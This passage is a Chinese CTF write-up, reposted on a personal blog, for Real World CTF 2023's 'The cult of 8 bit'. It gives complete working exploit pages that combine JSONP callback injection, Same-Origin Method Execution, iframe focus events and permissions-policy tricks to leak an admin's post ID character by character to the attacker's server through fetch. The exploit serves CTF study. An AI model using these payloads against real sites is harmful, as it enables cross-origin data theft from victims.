+<p>22121be0-5a1f-4cd7-be2d-be073a0cac22\x00</p>
+<p>最终经过 encodeURIComponent(id) 方法进行url编码后再拼接就成了</p>
+<p>1</p>
+<p>/api/post/22121be0-5a1f-4cd7-be2d-be073a0cac22%00</p>
+<p>这个url放到 open 方法中正好是会报错的，解决了第一个点。</p>
+<p>对于第二个点可以这样构造</p>
+<p>1</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00</p>
+<p>不过多解释了，看图就明白了</p>
+<p>这样我们就可以随便控制 callback 参数来实现 SOME 攻击了。</p>
+<p>方案二</p>
+<p>思路来自 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit">https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit</a></p>
+<p>这个思路也很巧妙</p>
+<p>上文也说过，iframe可以通过 allow属性来设置一些特征策略，其中包括了 sync-xhr策略，可以在iframe中加载</p>
+<p>1</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23</p>
+<p>同时设置其 allow="sync-xhr 'none'" 来禁用 xhr，使得try捕获异常从而跳转使用jsonp访问</p>
+<p>这里截获 callback 参数同上，原理是一样的。</p>
+<p>test2.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<html>
+
+
+
+<script>
+
+var iframe = document.createElement('iframe');
+
+iframe.src = "http://localhost:
+12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23";
+
+iframe.allow = "sync-xhr 'none'";
+
+document.body.appendChild(iframe);
+
+</script>
+
+
+
+</html>
+
+<p>上面两个方案之后的操作都是配合 SOME 攻击，利用 focus 事件 + iframe来逐位爆破post id。详细见下文题解。</p>
+<p>题解</p>
+<p>下文用到的知识点是SOME ATTACK，强烈建议先看论文 <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a></p>
+<p>方案一</p>
+<p>紧接着上文方案一，我们创建4个html文件</p>
+<p>注意location虽然变了，但opener是不变的</p>
+<p>a.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<script>
+
+open("/b.html");//打开b.html
+
+location="http://localhost:
+12345/";//重定向到admin的主页面（含有post id）
+
+</script>
+
+<p>a.html负责打开 /b.html 和将自身页面重定向到 <a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/</p>
+<p>b.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>23</p>
+<p>24</p>
+<p>25</p>
+<p>26</p>
+<p>27</p>
+<p>28</p>
+<p>29</p>
+<p>30</p>
+<p>31</p>
+<p><a href="#">default</a><!--默认聚焦点--></p>
+<script>
+
+//生成对应的iframe
+
+//post id是uuid，范围是 0-9 a-f 和 -
+
+var charList = "0123456789abcdef-";//注意把数字放前面，应为window['4']和window[4]是一样的
+
+var resId = "";
+
+charList.split('').forEach(name => createIframe(name));
+
+function createIframe(name) {
+
+let tmpIframe = document.createElement('iframe');
+
+tmpIframe.name = name;//为iframe设置name属性
+
+document.body.appendChild(tmpIframe);
+
+}
+
+//监听焦点变化
+
+function listenFocus() {
+
+let activeFocusName = document.activeElement.name;
+
+if(activeFocusName) {//若监听到iframe焦点
+
+resId += activeFocusName;
+
+document.getElementById("default").focus();//初始化焦点
+
+fetch(`/res/${resId}`);
+
+}
+
+}
+
+setInterval(listenFocus, 100);
+
+open("/c.html");
+
+</script>
+
+<p>b.html 负责创建 0123456789abcdef- 每个字符的iframe页面，同时创建焦点监听器监听焦点情况，如果监听到某个iframe的焦点则发送该iframe的name。之后打开 /c.html。注意 b.html 的 opener 指向 a页面(<a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/)</p>
+<p>c.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<script>
+
+open("/d.html");
+
+//执行回调函数的页面
+
+location="http://localhost:
+12345/"
+
+</script>
+
+<p>c.html页面的 location受 d.html 页面控制，是个自由页面，用于执行SOME攻击。注意c.html 的 opener 指向 b.html</p>
+<p>d.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<script>
+
+const selfPostId = "6202f8a2-463d-4754-9675-eecde65b619c";//自己页面随便给个postid
+
+var host = "http://localhost:
+12345";
+
+async function sleep(ms) {
+
+return new Promise(resolve => setTimeout(resolve, ms));
+
+}
+
+async function main() {
+
+for(let i = 0; i < 36; i++) {
+
+let payload =`opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;
+
+opener.location = `${host}/post/?id=${selfPostId}?callback=${payload}%23%00`;
+
+await sleep(200);//时间根据情况调整
+
+}
+
+}
+
+setTimeout(main, 500);//等待所有页面加载完整后启动主程序
+
+</script>
+
+<p>注意 d.html 的 opener 指向 c页面。该页面的为主启动页面，利用多级opener，结合SOME攻击和focus事件逐位爆破a页面的post id。</p>
+<p>4个页面放服务器上，之后向xss bot发送 <a target="_blank" rel="noopener" href="http://192.168.1.3/">http://192.168.1.3</a>:<br>8000/a.html 爆破即可</p>
+<p>方案二</p>
+<p>接上文题目分析的方案二</p>
+<p>需要两个页面</p>
+<p>index.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<script>
+
+open('/exp.html');
+
+location = 'http://localhost:
+12345/';
+
+</script>
+
+<p>exp.html</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>23</p>
+<p>24</p>
+<p>25</p>
+<p>26</p>
+<p>27</p>
+<p>28</p>
+<p>29</p>
+<p>30</p>
+<p>31</p>
+<p>32</p>
+<p>33</p>
+<p>34</p>
+<p>35</p>
+<p>36</p>
+<p>37</p>
+<p>38</p>
+<p>39</p>
+<p>40</p>
+<p>41</p>
+<p>42</p>
+<p>43</p>
+<p>44</p>
+<p>45</p>
+<p>46</p>
+<p>47</p>
+<p>48</p>
+<p>49</p>
+<p>50</p>
+<p>51</p>
+<p><a href="#">default</a></p>
+<script>
+
+async function sleep(ms) {
+
+return new Promise(resolve => setTimeout(resolve, ms));
+
+}
+
+const selfId = "0780dd9c-e326-4786-ad80-e0e9d032cb4a";//自己给个存在的post id
+
+const host = "http://localhost:
+12345";//题目地址
+
+const charList = "0123456789abcdef-";
+
+var resId = "";
+
+function createCharIframe(name) {
+
+var tmpIframe = document.createElement('iframe');
+
+tmpIframe.name = name;
+
+document.body.appendChild(tmpIframe);
+
+}
+
+charList.split('').forEach(name => createCharIframe(name));
+
+(function createChallengeIframe() {
+
+var challengeIframe = document.createElement('iframe');
+
+challengeIframe.name = "challenge";
+
+challengeIframe.src = host;
+
+challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr
+
+document.body.appendChild(challengeIframe);
+
+})();
+
+async function exploit() {
+
+var challenge = window['challenge'];
+
+for(let i = 0; i < 36; i++) {
+
+//payload
+
+let payload =`top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;
+
+challenge.location = `${host}/post/?id=${selfId}%3Fcallback=${payload}%23`;
+
+await sleep(200);//时间根据情况调整
+
+}
+
+}
+
+//监听焦点变化
+
+function listenFocus() {
+
+var activeFocusName = document.activeElement.name;
+
+if(activeFocusName) {//若监听到iframe焦点
+
+resId += activeFocusName;
+
+document.getElementById("default").focus();//初始化焦点
+
+fetch(`/res/${resId}`);
+
+}
+
+}
+
+setInterval(listenFocus, 100);
+
+sleep(2000);
+
+exploit();
+
+</script>
+
+<p>同样是利用 SOME ATTACK 和iframe的focus事件来爆破post id。</p>
+<p>上述两个方案的题解中有关同源策略的问题可以自己体会体会。</p>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://sh1yo.art/ctf/thecultof8bit/">https://sh1yo.art/ctf/thecultof8bit/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit">https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Permissions_Policy">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Permissions_Policy</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest</a></p>
+<p>原文始发于pank1s：[原创]Realworld CTF 2023 The_cult_of_8_bit详解</p>
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/91479.html">https://www.ctfiot.com/91479.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%5B%E5%8E%9F%E5%88%9B%5DRealworld_CTF_2023_The_cult_of_8_bit%E8%AF%A6%E8%A7%A3.full.md">CTF大赛WP集合/articles/[原创]Realworld_CTF_2023_The_cult_of_8_bit详解.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/some-attack-jsonp/">some_attack_jsonp</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Web/%E4%BB%8EWiz_Cluster_Games_%E6%8C%91%E6%88%98%E8%B5%9B%E6%BC%AB%E8%B0%88K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/" title="从Wiz Cluster Games挑战赛漫谈K8s集群安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">从Wiz Cluster Games挑战赛漫谈K8s集群安全</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Web/%E5%8E%9F%E5%88%9B-Realworld_CTF_2023_ChatUWU_%E8%AF%A6%E8%A7%A3/" title="[原创] Realworld CTF 2023 ChatUWU 详解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[原创] Realworld CTF 2023 ChatUWU 详解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
